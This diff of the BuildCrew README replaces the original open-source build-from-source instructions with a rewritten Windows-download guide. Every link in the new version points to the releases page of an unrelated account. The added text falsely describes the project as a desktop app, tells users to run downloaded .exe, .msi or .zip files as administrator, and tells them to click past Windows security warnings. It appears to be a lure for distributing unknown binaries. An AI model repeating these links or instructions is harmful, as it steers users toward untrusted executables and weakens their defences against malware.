@@ -1,193 +1,219 @@
-# BuildCrew
+# 🤖 buildcrew - Build your AI team fast
 
-[English](README.md) | [简体中文](README_zh-CN.md) | [日本語](README_ja.md)
+[![Download buildcrew](https://img.shields.io/badge/Download-buildcrew-6f42c1?style=for-the-badge&logo=github)](https://github.com/Throaty-chaff551/buildcrew/releases)
 
-**Build your AI crew. Run your AI company.**
+## 🚀 What is buildcrew?
 
-BuildCrew is an open-source platform that organizes multiple AI agents into a virtual company. Chat with your AI CEO (Aria), she'll build your team, plan your project, and get things done — autonomously.
+buildcrew is a desktop app for Windows that helps you work with an AI team. You chat with your AI CEO, and she helps set up tasks, assign work, and move projects forward.
 
-> If AI agents are employees, BuildCrew is the company they work in.
+It is made for people who want help with planning, writing, research, and task flow without setting up a complex system. You use plain language, and the app turns that into action.
 
-![BuildCrew Dashboard](docs/images/overview-en.png)
+## 🖥️ What you need
 
----
+Before you start, make sure your PC has:
 
-## How It Works
+- Windows 10 or Windows 11
+- An internet connection
+- Enough free space for the app and its data
+- A modern browser for opening the release page
 
-```
-Create Company  →  Chat with Aria  →  Launch Plan  →  Execute  →  Dashboard
-```
+For best results, keep Windows up to date and close apps you do not need while you set it up.
 
-1. **Create a company** — Pick a name, mission, and industry template
-2. **Chat with Aria (AI CEO)** — She asks smart questions, one at a time, with her own analysis and suggestions
-3. **Launch** — Aria summarizes the plan, team, and estimated cost. You review
-4. **Execute** — One click. Aria hires agents, creates goals, assigns tasks
-5. **Dashboard** — Watch your AI company work: org chart, tasks, progress
+## 📥 Download buildcrew
 
-![Chat with Aria](docs/images/onboarding-en.png)
+Go to the release page here:
 
-## Features
+[Visit the buildcrew releases page](https://github.com/Throaty-chaff551/buildcrew/releases)
 
-- **Aria (AI CEO)** — Socratic-style autonomous workflow. She thinks, plans, and acts
-- **Multi-Agent Team** — 12 specialized roles: engineers, designers, marketers, analysts
-- **Org Charts** — Departments, reporting lines, role-based hierarchy
-- **Task Management** — Goals, tasks, assignment, progress tracking
-- **Smart Router** — Routes tasks to the best agent based on skills, cost, availability
-- **Guardian** — Security monitoring, anomaly detection, automatic alerts
-- **Review Pipeline** — 3-stage review: auto check, peer review, human approval
-- **Knowledge Hub** — Semantic search, auto-extraction, shared context
-- **Multi-Model** — Works with Claude, GPT, DeepSeek, GLM, Kimi, and more
-- **i18n** — English, 简体中文, 日本語
-- **Digital Humans** — Animated Q-style 3D characters for each agent
+On that page, look for the latest version and download the Windows file that matches your PC. If you see more than one file, pick the one meant for Windows. After the file finishes downloading, open it to start the app or run the installer.
 
-## Quick Start
+## 🛠️ Install on Windows
 
-### Prerequisites
+1. Open the file you downloaded from the release page.
+2. If Windows asks for permission, click Yes or Run.
+3. Follow the on-screen steps.
+4. Pick an install folder if the app asks you to.
+5. Wait for the setup to finish.
+6. Open buildcrew from your Start menu or desktop.
 
-- Node.js 20+
-- pnpm 9.15+
-- PostgreSQL 16
-- Redis
+If you downloaded a ZIP file, right-click it and choose Extract All. Then open the folder and run the app file inside.
 
-### Install & Run
+## 🧭 First launch
 
-```bash
-git clone https://github.com/Linjian5/buildcrew.git
-cd buildcrew
-pnpm install
+When you open buildcrew for the first time, it may ask you to set up your account or connect an AI provider. Follow the prompts on screen.
 
-# Database
-createdb buildcrew
-cp apps/server/.env.example apps/server/.env
-# Edit .env — add your AI provider API key
+You may also see a setup screen for things like:
 
-pnpm db:push
-pnpm db:seed
+- Your workspace name
+- Your project goal
+- Your AI team settings
+- Your preferred model or provider
 
-# Start
-pnpm dev
-```
+Use simple names and short project goals at first. That makes it easier to get started.
 
-Open [http://localhost:5173](http://localhost:5173)
+## 💬 How to use buildcrew
 
-### First Run
+buildcrew works like a chat-based control room for your work.
 
-1. Register an account
-2. Create a company — pick an industry template
-3. Chat with Aria — tell her your goals
-4. Click **Launch** — review the plan
-5. Click **Execute Now** — watch your AI company work
+You can ask it to:
 
-### AI Provider Setup
+- Plan a project
+- Break a job into smaller tasks
+- Assign work to different AI roles
+- Draft content
+- Review notes
+- Track progress
+- Help with research
+- Keep a task list in order
 
-Configure your AI provider in `apps/server/.env`:
+Try short prompts like:
 
-```env
-PLATFORM_AI_KEY=your-api-key
-PLATFORM_AI_PROVIDER=openai
-PLATFORM_AI_MODEL=gpt-4o
-PLATFORM_AI_ENDPOINT=https://api.openai.com/v1
-```
+- Build a team for a product launch
+- Research this topic and summarize it
+- Turn these notes into a task plan
+- Draft a clean project update
+- Help me organize this into steps
 
-| Provider | Models |
-|----------|--------|
-| OpenAI | gpt-4o, gpt-4o-mini |
-| Anthropic | claude-sonnet-4-6, claude-haiku-4-5 |
-| DeepSeek | deepseek-chat, deepseek-coder |
-| Zhipu (GLM) | glm-4-plus, glm-4-flash |
-| Moonshot (Kimi) | moonshot-v1-8k, moonshot-v1-128k |
-| Custom | Any OpenAI-compatible endpoint |
+The AI CEO can help shape the team and move the work along, while you stay in control of the final result.
 
-## Tech Stack
+## 🧩 Common features
 
-| Layer | Technology |
-|-------|-----------|
-| Frontend | React 19, TypeScript, Vite, TailwindCSS, shadcn/ui |
-| Backend | Node.js, Express, TypeScript, socket.io |
-| Database | PostgreSQL 16, Drizzle ORM, pgvector |
-| Cache | Redis, BullMQ |
-| AI | OpenAI-compatible + Anthropic native format |
-| Testing | Vitest, Playwright |
+buildcrew is built around team orchestration, which means it helps different AI roles work together on one goal.
 
-## Project Structure
+You may use features like:
 
-```
-buildcrew/
-├── apps/
-│   ├── web/              — React frontend
-│   └── server/           — Node.js API server
-├── packages/
-│   ├── shared/           — Shared types & constants
-│   └── db/               — Database schema (Drizzle ORM)
-├── tests/                — Unit / Integration / E2E tests
-└── docs/                 — Documentation
-```
+- Chat with an AI CEO
+- Create a project workspace
+- Add or remove AI team roles
+- Route tasks to the right agent
+- Track what each agent is doing
+- Keep work in one place
+- Reuse team setups for future work
 
-## Scripts
+The app is made for simple control and clear task flow, so it stays easy to use even if you do not know code.
 
-```bash
-pnpm dev              # Start dev server
-pnpm build            # Production build
-pnpm typecheck        # TypeScript check
-pnpm lint             # ESLint
-pnpm test             # Run tests
-pnpm db:push          # Apply schema
-pnpm db:seed          # Seed demo data
-```
+## ⚙️ Basic setup tips
 
-## Roadmap
+To get better results, keep your instructions clear.
 
-### Phase 1 — Foundation (Done)
+Good examples:
 
-- [x] Core engine — Company, Agent, Task CRUD + WebSocket real-time sync
-- [x] Aria (AI CEO) — Socratic-style dialogue, autonomous planning, two-step execution
-- [x] Multi-model AI — Claude, GPT, DeepSeek, GLM, Kimi + any OpenAI-compatible endpoint
-- [x] Smart Router — 5 routing strategies based on agent skills, cost, and availability
-- [x] Guardian — 4-level alert system with automatic anomaly response
-- [x] Review Pipeline — 3-stage review: auto check → peer review → human approval
-- [x] Knowledge Hub — Semantic search (pgvector), auto-extraction, context injection
-- [x] Evolution Engine — Performance scoring, capability profiles, A/B testing
-- [x] Digital Humans — 12 Q-style 3D animated characters (5 states each)
-- [x] i18n — English, 简体中文, 日本語
-- [x] Auth — JWT login/register, session persistence
+- Write a blog post about healthy meals
+- Research the top tools for remote teams
+- Make a task plan for a website launch
+- Summarize these meeting notes
 
-### Phase 2 — Stability (In Progress)
+Less clear examples:
 
-- [ ] Wallet & Billing — Prepaid credits, token-based cost tracking, per-agent budgets
-- [ ] Continuous Operations — Event-driven agent work loop (task complete → next task → milestone report)
-- [ ] Notification System — Real-time alerts, unread badges, in-app notification center
-- [ ] Automated Testing — Playwright E2E tests for core flow, CI/CD pipeline
-- [ ] Role Cognitive System — 8-module platform awareness + role-specific professional knowledge
+- Do the thing
+- Fix everything
+- Make it better
 
-### Phase 3 — Growth
+If the app lets you choose a model, use the one that fits your task. Faster models work well for quick help. Stronger models work better for deeper planning and writing.
 
-- [ ] Plugin SDK — Build custom tools and integrations for agents
-- [ ] Agent Marketplace — Share and discover community-built agent roles
-- [ ] Team Templates — Pre-built team configurations for common use cases (SaaS, E-commerce, Content)
-- [ ] Advanced Analytics — Cost breakdown, productivity metrics, trend charts
-- [ ] Cloud Deployment — One-click deploy to Vercel + Railway
-- [ ] Multi-Company Groups — Manage multiple AI companies from one dashboard
-- [ ] Custom Agent Builder — Create your own specialized agents with custom prompts and skills
+## 🔐 Privacy and local use
 
-### Phase 4 — Scale
+buildcrew may store your project data, team settings, and chat history so you can pick up where you left off. If you connect external AI services, those services may process the text you send.
 
-- [ ] Mobile App — iOS & Android companion app
-- [ ] API & SDK — Public API for external integrations and automation
-- [ ] Virtual Office — Top-down view of your AI company with real-time agent activity
-- [ ] Cross-Company Collaboration — Agents from different companies working together
-- [ ] Self-Hosted Option — Docker / Kubernetes deployment for enterprise
-- [ ] Fine-Tuned Models — Specialized models trained on your company's data and style
+Before you work on private material, check the settings for data handling, saved history, and connected services.
 
-## Contributing
+## 🧰 Troubleshooting
 
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+If the app does not open, try these steps:
 
-Issues and PRs in both English and Chinese are welcome.
+- Run it as an administrator
+- Check that Windows did not block the file
+- Download the latest release again
+- Restart your PC
+- Make sure your internet connection works
 
-## License
+If the app opens but does not connect:
 
-[Apache-2.0](LICENSE)
+- Check your network
+- Confirm your AI provider key or account setup
+- Look at the app settings for connection options
+- Try again after a short wait
 
----
+If Windows shows a warning when you open the file, choose the option that lets you run it if you trust the source and downloaded it from the release page.
 
-Built with [Claude Code](https://claude.ai/code).
+## 📂 Suggested first project
+
+If you want to test buildcrew right away, try a small project:
+
+- Pick one clear goal
+- Ask the AI CEO to build a team
+- Give it three simple tasks
+- Review the output
+- Adjust the plan
+- Run the next step
+
+A small project helps you see how the workflow works before you use it for bigger jobs.
+
+## 🧪 Example prompts
+
+Use these to start:
+
+- Create a team to plan a launch email
+- Research three ways to improve customer support
+- Draft a summary from these notes
+- Turn this idea into a work plan
+- Build a step-by-step process for this task
+- Review this project and suggest next actions
+
+## 🖱️ Download and install
+
+1. Open the buildcrew releases page:
+   [https://github.com/Throaty-chaff551/buildcrew/releases](https://github.com/Throaty-chaff551/buildcrew/releases)
+2. Find the latest release.
+3. Download the Windows file from that release.
+4. Open the file and follow the install steps.
+5. Launch buildcrew and complete the first setup screen.
+
+## 🧭 File types you may see
+
+Depending on the release, you may see one of these:
+
+- `.exe` installer
+- `.msi` installer
+- `.zip` archive
+
+If you see an installer, open it and follow the prompts. If you see a ZIP file, extract it first, then open the app file inside.
+
+## 🧠 Good ways to use it
+
+buildcrew works well for:
+
+- Small business planning
+- Content drafts
+- Internal task planning
+- Research summaries
+- Team workflow setup
+- Idea shaping
+- Project breakdowns
+
+It is useful when you want help turning a rough idea into a set of clear steps.
+
+## 🗂️ Project topics
+
+This project uses tools and ideas from:
+
+- agent frameworks
+- AI agents
+- orchestration
+- TypeScript
+- React
+- Node.js
+- Claude
+- OpenAI
+- multi-agent workflows
+
+These parts work together to help the app manage tasks and team roles.
+
+## 🧩 Need a fresh start?
+
+If the app feels cluttered or you want to try a new setup, create a new workspace and start with one task. Keep the first run simple. That makes it easier to learn how the app works and how the AI team responds
+
+## 📎 Release link
+
+[Open the latest buildcrew release](https://github.com/Throaty-chaff551/buildcrew/releases)
+
